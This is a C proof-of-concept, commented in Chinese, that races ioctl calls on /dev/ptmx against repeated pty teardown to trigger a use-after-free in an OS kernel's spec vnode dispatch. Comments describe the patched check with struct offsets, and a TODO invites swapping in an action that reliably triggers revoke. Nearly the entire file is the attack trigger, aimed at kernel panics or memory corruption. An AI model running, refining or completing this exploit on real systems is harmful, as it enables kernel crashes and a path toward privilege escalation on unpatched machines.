// spec_ioctl_revoke_race.c — 目标：27.1 的 spec vnode revoke 竞态 UAF
//
// 核心机制（spec_vnops.c）：
//   27.2 在 spec ioctl 派发前新增：
//       obj = *(vnode + 0xD8);                      // 后端对象（PAC，AUTDA 认证）
//       if (obj && (*(u8*)(obj + 0x70) & 0x10))     // 已 revoke / teardown 标记
//           return ENXIO(6);                        // 拒绝派发
//       major = *(u32*)(*(vnode+0x78) + 0x18) >> 24 // 只有通过上面才走 speclist
//   27.1 没有这段：后端拆除后 ioctl 仍按 major 派发到已释放的 spec 后端 → UAF。
//
// 思路：一个线程持续 ioctl(specfd)，另一个线程反复触发该 spec vnode 的 revoke/拆除，
//       命中「拆除完成 → 派发仍在进行」的窗口。
//
// build: clang -O2 -o spec_race spec_ioctl_revoke_race.c -lpthread

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/ttycom.h>
#include <termios.h>

static volatile int g_stop = 0;
static int g_spec_fd = -1;          // 被 ioctl 的 spec 节点
static char g_path[128];

// ioctl 线程：用对 spec 后端有副作用的命令，确保真的走进 VNOP_IOCTL
static void *ioctl_loop(void *arg) {
    (void)arg;
    unsigned long n = 0;
    while (!g_stop) {
        // 选对后端实现有实质访问的命令；TIOCGETA 会读 tty 结构
        struct termios t; struct winsize w; int avail = 0;
        ioctl(g_spec_fd, TIOCGETA, &t);
        ioctl(g_spec_fd, TIOCGWINSZ, &w);
        ioctl(g_spec_fd, FIONREAD, &avail);
        if ((++n & 0xFFFF) == 0) printf("  ioctl %lu\n", n);
    }
    return NULL;
}

// 拆除线程：反复重开同一 spec 节点并关闭配对端，促使 revoke/teardown 反复发生
static void *teardown_loop(void *arg) {
    (void)arg;
    while (!g_stop) {
        int fd = open(g_path, O_RDWR | O_NONBLOCK);
        if (fd >= 0) {
            // 对 pty 从端：关闭主端会触发从端 tty 拆除（revoke 路径之一）
            // TODO-1: 换成你实测能触发 VNOP_REVOKE 的动作（devfs detach / 配对端关闭 / kext 卸载）
            close(fd);
        }
        // 也尝试通过 posix_openpt 走 pty 主端-从端配对
        int m = posix_openpt(O_RDWR | O_NOCTTY | O_NONBLOCK);
        if (m >= 0) {
            grantpt(m); unlockpt(m);
            const char *s = ptsname(m);
            if (s) {
                int sl = open(s, O_RDWR | O_NOCTTY | O_NONBLOCK);
                if (sl >= 0) close(sl);      // 从端关闭
            }
            close(m);                        // 主端关闭 → 从端 teardown
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    // 默认用 ptmx；也可指定 /dev/ 下任意 spec 字符设备
    snprintf(g_path, sizeof(g_path), "%s", argc > 1 ? argv[1] : "/dev/ptmx");

    g_spec_fd = open(g_path, O_RDWR | O_NONBLOCK);
    if (g_spec_fd < 0) { perror("open spec"); return 1; }
    printf("[*] spec fd=%d path=%s\n", g_spec_fd, g_path);

    pthread_t t1[2], t2;
    pthread_create(&t2, NULL, teardown_loop, NULL);
    for (int i = 0; i < 2; i++) pthread_create(&t1[i], NULL, ioctl_loop, NULL);

    sleep(60);          // 观察期：命中后应看到 panic / UAF 报告
    g_stop = 1;
    for (int i = 0; i < 2; i++) pthread_join(t1[i], NULL);
    pthread_join(t2, NULL);
    printf("[*] 结束：无 panic = 窗口未命中，换 teardown 动作或加大并发\n");
    return 0;
}
